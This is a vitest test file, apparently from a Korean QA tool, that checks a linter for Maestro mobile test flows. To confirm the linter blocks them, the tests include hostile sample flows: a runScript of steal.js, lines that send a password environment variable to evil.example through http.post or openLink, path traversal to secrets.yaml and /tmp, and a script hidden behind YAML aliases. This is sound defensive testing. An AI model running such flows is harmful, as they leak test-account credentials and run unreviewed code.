import { existsSync, readdirSync, readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { ensureFlowHeader, lintCommandsYaml, lintFlow, lintSubflow, type FlowLintContext } from "./flow-lint";
import { loadWorkspace } from "./load";

const APPS = resolve(__dirname, "../../../examples/qa-workspace/apps");
const ctx: FlowLintContext = { tcId: "TC-0101", envKeys: ["DEMO_TEST_PASSWORD"], subflows: ["common/launch-clean.yaml"], expectations: 2 };

const HEADER = "appId: ${APP_ID}\nname: TC-0101 가입\ntags: [TC-0101]\n---\n";
function rules(body: string, c: Partial<FlowLintContext> = {}): string[] {
  return lintFlow(HEADER + body, { ...ctx, ...c }).map((i) => `${i.level}:${i.rule}`);
}

describe("lintFlow (부록 B)", () => {
  it("예시 워크스페이스의 플로우는 규약을 지킨다", () => {
    expect(lintFlow(readFileSync(resolve(APPS, "demo/flows/ios/TC-0101.yaml"), "utf8"), ctx)).toEqual([]);
    const sample = lintFlow(readFileSync(resolve(APPS, "sample/flows/ios/TC-0002.yaml"), "utf8"), {
      tcId: "TC-0002",
      envKeys: ["SAMPLE_TEST_STUDENT_ID", "SAMPLE_TEST_STUDENT_PW"],
      subflows: ["common/launch-clean.yaml", "common/close-keyboard.yaml", "common/dismiss-system-prompts.yaml"],
      expectations: 1,
    });
    expect(sample).toEqual([]);
  });

  it("좌표 탭은 오류(point, '50%,50%')", () => {
    const body = '- runFlow: common/launch-clean.yaml\n- tapOn:\n    point: "50%,50%"\n- tapOn: "120, 300"\n- assertVisible: "가입하기"\n- assertVisible: "x"\n';
    expect(rules(body).filter((r) => r === "error:flow-coordinates")).toHaveLength(2);
  });

  it("캡처 전 대표 요소 대기와 캡처 이름 형식", () => {
    const body = '- runFlow: common/launch-clean.yaml\n- tapOn: "가입"\n- takeScreenshot: 01_signup\n- assertVisible: "a"\n- takeScreenshot: Signup\n- assertVisible: "b"\n';
    const r = lintFlow(HEADER + body, ctx);
    expect(r.map((i) => i.rule)).toEqual(["flow-screenshot-wait", "flow-screenshot-name"]);
    expect(r[0]?.line).toBe(7);
  });

  it("env 키는 계정 역할의 키와 APP_ID 만, 서브플로우는 있는 것만", () => {
    const body = '- runFlow: common/launch-clean.yaml\n- inputText: ${OTHER_PASSWORD}\n- runFlow: common/nope.yaml\n- runFlow: ../../secrets.yaml\n- inputText: ${DEMO_TEST_PASSWORD}\n- assertVisible: "a"\n- assertVisible: "b"\n';
    expect(rules(body)).toEqual(["error:flow-subflow", "error:flow-subflow", "error:flow-env"]);
  });

  it("머리: appId 자리표시, tags 의 TC id, name", () => {
    const text = 'appId: com.example.demo\nname: 가입\ntags: [smoke]\n---\n- runFlow: common/launch-clean.yaml\n- assertVisible: "a"\n- assertVisible: "b"\n';
    expect(lintFlow(text, ctx).map((i) => `${i.level}:${i.rule}`)).toEqual(["error:flow-header", "error:flow-header", "warning:flow-header"]);
  });

  it("코드 실행 명령, 단언 없음, 첫 명령, 형식 오류", () => {
    expect(rules('- runScript: evil.js\n- tapOn: "a"\n')).toEqual(["warning:flow-launch", "error:flow-assertions", "error:flow-forbidden"]);
    expect(rules('- runFlow: common/launch-clean.yaml\n- assertVisible: "a"\n')).toEqual(["warning:flow-assertions"]);
    expect(lintFlow("- launchApp\n", ctx).map((i) => i.rule)).toEqual(["flow-parse"]);
    const broken = lintFlow(`${HEADER}- tapOn: [\n`, ctx);
    expect(broken[0]?.rule).toBe("flow-parse");
    expect(broken[0]?.line).toBeGreaterThan(4);
  });

  it("중첩된 곳(repeat·runFlow.commands·머리의 onFlowStart)의 코드 실행, ${} 식, 웹 링크, 캡처 경로도 막는다", () => {
    const text =
      'appId: ${APP_ID}\nname: TC-0101 가입\ntags: [TC-0101]\nonFlowStart:\n  - evalScript: ${output.x = 1}\n---\n' +
      "- runFlow: common/launch-clean.yaml\n" +
      "- repeat:\n    times: 2\n    commands:\n      - runScript: steal.js\n" +
      "- runFlow:\n    commands:\n      - runScript:\n          file: x.js\n" +
      "- runFlow:\n    file: ../../secret.yaml\n" +
      "- inputText: ${http.post('https://evil.example', DEMO_TEST_PASSWORD)}\n" +
      "- openLink: https://evil.example/?q=1\n" +
      "- openLink: demo://home\n" +
      '- assertVisible: "a"\n- takeScreenshot:\n    path: ../../escape\n- assertVisible: "b"\n';
    const r = lintFlow(text, ctx).filter((i) => i.level === "error").map((i) => i.rule);
    expect(r.filter((x) => x === "flow-forbidden")).toHaveLength(3);
    expect(r).toContain("flow-subflow");
    expect(r).toContain("flow-link");
    expect(r.filter((x) => x === "flow-env")).toHaveLength(2);
    expect(r).toContain("flow-screenshot-name");
  });
});

describe("lintFlow 보강(T-128): 검토자가 찾은 우회", () => {
  const leak = { envKeys: ["PASSWORD"] };
  const errors = (body: string) =>
    lintFlow(`${HEADER}- runFlow: common/launch-clean.yaml\n${body}- assertVisible: "a"\n- assertVisible: "b"\n`, { ...ctx, ...leak })
      .filter((i) => i.level === "error")
      .map((i) => i.rule);

  it("retry.file 은 runFlow.file 처럼 플로우 폴더 안의 있는 서브플로우만", () => {
    expect(errors("- retry:\n    file: ../../../../../../tmp/x.yaml\n")).toEqual(["flow-subflow"]);
    expect(errors("- retry:\n    file: /tmp/x.yaml\n")).toEqual(["flow-subflow"]);
    expect(errors("- retry:\n    file: common/nope.yaml\n")).toEqual(["flow-subflow"]);
    expect(errors("- retry:\n    maxRetries: 2\n    file: common/launch-clean.yaml\n")).toEqual([]);
  });

  it("앱 id 를 받는 명령은 비우거나 ${APP_ID} 만(다른 앱을 띄우고 계정 값을 입력하는 플로우)", () => {
    expect(errors("- launchApp:\n    appId: com.apple.mobilesafari\n- inputText: evil.example/?p=${PASSWORD}\n")).toEqual(["flow-app-id"]);
    expect(errors("- launchApp: com.apple.mobilesafari\n")).toEqual(["flow-app-id"]);
    expect(errors("- launchApp:\n    url: com.apple.mobilesafari\n")).toEqual(["flow-app-id"]);
    expect(errors("- stopApp: com.example.other\n- killApp: com.example.other\n- clearState: com.example.other\n")).toEqual(["flow-app-id", "flow-app-id", "flow-app-id"]);
    expect(errors("- stopApp:\n    appId: com.example.other\n- setPermissions:\n    appId: com.example.other\n    permissions:\n      all: allow\n")).toEqual(["flow-app-id", "flow-app-id"]);
    expect(errors("- runFlow:\n    env:\n      APP_ID: com.apple.mobilesafari\n    commands:\n      - launchApp\n")).toEqual(["flow-app-id"]);
    expect(
      errors("- launchApp:\n    appId: ${APP_ID}\n    clearState: true\n- stopApp\n- stopApp: ${APP_ID}\n- killApp:\n    appId: ${APP_ID}\n- clearState\n- launchApp:\n    clearState: true\n"),
    ).toEqual([]);
  });

  it("addMedia 는 오류", () => {
    expect(errors("- addMedia: [/Users/someone/Pictures/private.png]\n")).toEqual(["flow-media"]);
    expect(errors("- addMedia:\n    files: [x.png]\n")).toEqual(["flow-media"]);
  });

  it("앵커·별칭·글자가 아닌 맵 키는 오류(별칭 뒤에 숨긴 runScript)", () => {
    const hidden = "- repeat:\n    times: 1\n    ? &c [ {runScript: steal.js} ]\n    : x\n    commands: *c\n";
    const r = errors(hidden);
    expect(r).toContain("flow-yaml-structure");
    expect(r.filter((x) => x === "flow-yaml-structure")).toHaveLength(3);
    expect(errors('- tapOn: &t "a"\n')).toEqual(["flow-yaml-structure"]);
    expect(errors("- tapOn:\n    ? [id]\n    : x\n")).toEqual(["flow-yaml-structure"]);
  });

  it("openLink 안의 ${…} 는 오류(스칼라와 link 필드)", () => {
    expect(errors("- openLink: x-safari-https://evil.example/?p=${PASSWORD}\n")).toEqual(["flow-link-env"]);
    expect(errors("- openLink:\n    link: demo://share?p=${PASSWORD}\n")).toEqual(["flow-link-env"]);
    expect(errors("- openLink: demo://home\n")).toEqual([]);
  });
});

/**
 * 워크스페이스 폴더의 모든 플로우를 앱과 같은 맥락으로 린트한 오류. TC 플로우는 그 TC 계정 역할의 키(플로우 만들기와 같은 기준),
 * 공통 서브플로우는 앱의 모든 키(서브플로우 저장과 같은 기준)
 */
function workspaceLintErrors(root: string): { flows: number; errors: string[] } {
  const ws = loadWorkspace(root);
  const errors: string[] = [];
  const siblings = (path: string) =>
    readdirSync(join(root, dirname(path)))
      .filter((n) => /\.ya?ml$/.test(n))
      .sort();
  for (const flow of ws.flows) {
    const text = readFileSync(join(root, flow.path), "utf8");
    const accounts = ws.apps[flow.app]?.accounts ?? {};
    let issues;
    if (flow.tcId === null) {
      const name = flow.path.split("/").at(-1);
      issues = lintSubflow(text, { envKeys: Object.values(accounts).flatMap((r) => r.keys), subflows: siblings(flow.path).filter((n) => n !== name) });
    } else {
      const tc = ws.testcases.find((t) => t.app === flow.app && t.id === flow.tcId)?.doc;
      if (!tc) {
        errors.push(`${flow.path}: 테스트 케이스가 없다`);
        continue;
      }
      const role = tc.frontMatter.account;
      const commonDir = join(root, dirname(flow.path), "common");
      issues = lintFlow(text, {
        tcId: flow.tcId,
        envKeys: role ? (accounts[role]?.keys ?? []) : [],
        subflows: existsSync(commonDir) ? siblings(`${dirname(flow.path)}/common/x`).map((n) => `common/${n}`) : [],
        expectations: tc.steps.reduce((n, st) => n + st.expected.length, 0),
      });
    }
    for (const i of issues.filter((x) => x.level === "error")) errors.push(`${flow.path}:${i.line ?? "-"} ${i.rule}`);
  }
  return { flows: ws.flows.length, errors };
}

describe("지금 있는 워크스페이스의 플로우", () => {
  const ROOT = resolve(__dirname, "../../..");
  it("예시 워크스페이스의 플로우와 서브플로우는 오류가 없다", () => {
    const r = workspaceLintErrors(join(ROOT, "examples/qa-workspace"));
    expect(r.flows).toBeGreaterThan(0);
    expect(r.errors).toEqual([]);
  });

  // local/ 은 공개하지 않는 폴더라 없을 수 있다
  const local = existsSync(join(ROOT, "local")) ? readdirSync(join(ROOT, "local")).filter((n) => n.endsWith("-workspace")) : [];
  it.skipIf(local.length === 0).each(local)("local/%s 의 플로우와 서브플로우는 오류가 없다", (name) => {
    const r = workspaceLintErrors(join(ROOT, "local", name));
    expect(r.flows).toBeGreaterThan(0);
    expect(r.errors).toEqual([]);
  });
});

describe("lintCommandsYaml (탐색 중 maestro_run)", () => {
  const keys = { envKeys: ["DEMO_TEST_PASSWORD"] };
  it("명령 목록·머리 있는 플로우는 되고, 허용한 키와 APP_ID 만 쓸 수 있다", () => {
    expect(lintCommandsYaml('- tapOn: "로그인"\n- inputText: ${DEMO_TEST_PASSWORD}\n', keys)).toEqual([]);
    expect(lintCommandsYaml("appId: ${APP_ID}\n---\n- clearState\n- launchApp\n", keys)).toEqual([]);
  });
  it("서브플로우 파일, 코드 실행, 식, 지나치게 긴 입력, 목록이 아닌 것은 막는다", () => {
    const rules = (t: string) => lintCommandsYaml(t, keys).map((i) => i.rule);
    expect(rules("- runFlow: common/launch-clean.yaml\n")).toEqual(["flow-subflow"]);
    expect(rules("- evalScript: ${1+1}\n")).toEqual(["flow-forbidden", "flow-env"]);
    expect(rules("- inputText: ${OTHER_PW}\n")).toEqual(["flow-env"]);
    expect(rules(`- inputText: "${"x".repeat(30_000)}"\n`)).toEqual(["flow-size"]);
    expect(rules("just text\n")).toEqual(["flow-commands"]);
  });
  it("T-128 의 규칙도 탐색 명령에 적용된다", () => {
    const rules = (t: string) => lintCommandsYaml(t, keys).map((i) => i.rule);
    expect(rules("- launchApp:\n    appId: com.apple.mobilesafari\n")).toEqual(["flow-app-id"]);
    expect(rules("appId: com.apple.mobilesafari\n---\n- launchApp\n")).toEqual(["flow-app-id"]);
    expect(rules("name: x\n---\n- launchApp\n")).toEqual(["flow-app-id"]);
    expect(rules("- addMedia: [a.png]\n")).toEqual(["flow-media"]);
    expect(rules("- openLink: demo://x?p=${DEMO_TEST_PASSWORD}\n")).toEqual(["flow-link-env"]);
    expect(rules("- retry:\n    file: ../x.yaml\n")).toEqual(["flow-subflow"]);
    expect(rules("- tapOn: &a x\n- tapOn: *a\n")).toEqual(["flow-yaml-structure", "flow-yaml-structure"]);
  });
});

describe("lintSubflow (공통 서브플로우)", () => {
  const sub = { envKeys: ["DEMO_TEST_PASSWORD"], subflows: ["close-keyboard.yaml"] };
  const rules = (t: string) => lintSubflow(t, sub).map((i) => `${i.level}:${i.rule}`);

  it("예시 워크스페이스의 서브플로우는 규약을 지킨다. name·tags·캡처·단언 규칙은 보지 않는다", () => {
    for (const path of ["demo/flows/ios/common/launch-clean.yaml", "sample/flows/ios/common/launch-clean.yaml", "sample/flows/ios/common/close-keyboard.yaml", "sample/flows/ios/common/dismiss-system-prompts.yaml"]) {
      expect(lintSubflow(readFileSync(resolve(APPS, path), "utf8"), sub), path).toEqual([]);
    }
    expect(rules("appId: ${APP_ID}\n---\n- launchApp\n- takeScreenshot: home\n")).toEqual([]);
  });

  it("머리의 appId 자리표시, 두 문서, 명령 목록을 요구한다", () => {
    expect(rules("appId: com.example.demo\n---\n- launchApp\n")).toEqual(["error:flow-header"]);
    expect(rules("name: x\n---\n- launchApp\n")).toEqual(["error:flow-header"]);
    expect(rules("- launchApp\n")).toEqual(["error:flow-parse"]);
    expect(rules("appId: ${APP_ID}\n---\n")).toEqual(["error:flow-commands"]);
    expect(rules("appId: ${APP_ID}\n---\n- tapOn: [a\n")).toEqual(["error:flow-parse"]);
  });

  it("코드 실행, 계정 역할에 없는 env 키, 좌표, 웹 주소, 없는 서브플로우는 TC 플로우처럼 막는다", () => {
    const head = "appId: ${APP_ID}\n---\n";
    expect(rules(`${head}- runScript: x.js\n`)).toEqual(["error:flow-forbidden"]);
    expect(rules(`${head}- inputText: \${OTHER_PW}\n`)).toEqual(["error:flow-env"]);
    expect(rules(`${head}- inputText: \${DEMO_TEST_PASSWORD}\n- runFlow: close-keyboard.yaml\n`)).toEqual([]);
    expect(rules(`${head}- tapOn:\n    point: "50%,50%"\n`)).toEqual(["error:flow-coordinates"]);
    expect(rules(`${head}- openLink: https://example.com\n`)).toEqual(["error:flow-link"]);
    expect(rules(`${head}- runFlow: launch-clean.yaml\n`)).toEqual(["error:flow-subflow"]);
    expect(rules(`${head}- runFlow: ../ios/TC-0101.yaml\n`)).toEqual(["error:flow-subflow"]);
  });

  it("T-128 의 규칙도 서브플로우에 적용된다", () => {
    const head = "appId: ${APP_ID}\n---\n";
    expect(rules(`${head}- retry:\n    file: ../../../../tmp/x.yaml\n`)).toEqual(["error:flow-subflow"]);
    expect(rules(`${head}- killApp: com.example.other\n`)).toEqual(["error:flow-app-id"]);
    expect(rules(`${head}- addMedia: [a.png]\n`)).toEqual(["error:flow-media"]);
    expect(rules(`${head}- openLink: demo://x?p=\${DEMO_TEST_PASSWORD}\n`)).toEqual(["error:flow-link-env"]);
    expect(rules(`${head}- tapOn: &a x\n`)).toEqual(["error:flow-yaml-structure"]);
  });

  it("Maestro 가 실행 전에 내는 문법 오류(조건 없는 extendedWaitUntil, file·commands 가 둘 다거나 없는 runFlow·retry)를 막는다", () => {
    const head = "appId: ${APP_ID}\n---\n";
    expect(rules(`${head}- extendedWaitUntil:\n    timeout: 30000\n`)).toEqual(["error:flow-syntax"]);
    expect(rules(`${head}- extendedWaitUntil\n`)).toEqual(["error:flow-syntax"]);
    expect(rules(`${head}- extendedWaitUntil:\n    notVisible: "로딩"\n    timeout: 5000\n`)).toEqual([]);
    expect(rules(`${head}- runFlow:\n    when:\n      visible: "완료"\n`)).toEqual(["error:flow-syntax"]);
    expect(rules(`${head}- runFlow:\n    file: close-keyboard.yaml\n    commands:\n      - tapOn: "완료"\n`)).toEqual(["error:flow-syntax"]);
    expect(rules(`${head}- runFlow:\n    when:\n      visible: "완료"\n    commands:\n      - tapOn: "완료"\n`)).toEqual([]);
    expect(rules(`${head}- retry:\n    maxRetries: 2\n`)).toEqual(["error:flow-syntax"]);
    expect(rules(`${head}- retry:\n    maxRetries: 2\n    commands:\n      - tapOn: "다시 시도"\n`)).toEqual([]);
  });
});

describe("ensureFlowHeader", () => {
  it("명령 목록만 있으면 appId 머리를 붙이고, 머리가 있으면 그대로 둔다", () => {
    expect(ensureFlowHeader("- tapOn: a\n")).toBe("appId: ${APP_ID}\n---\n- tapOn: a\n");
    const full = "# c\nappId: ${APP_ID}\n---\n- launchApp\n";
    expect(ensureFlowHeader(full)).toBe(full);
  });
});
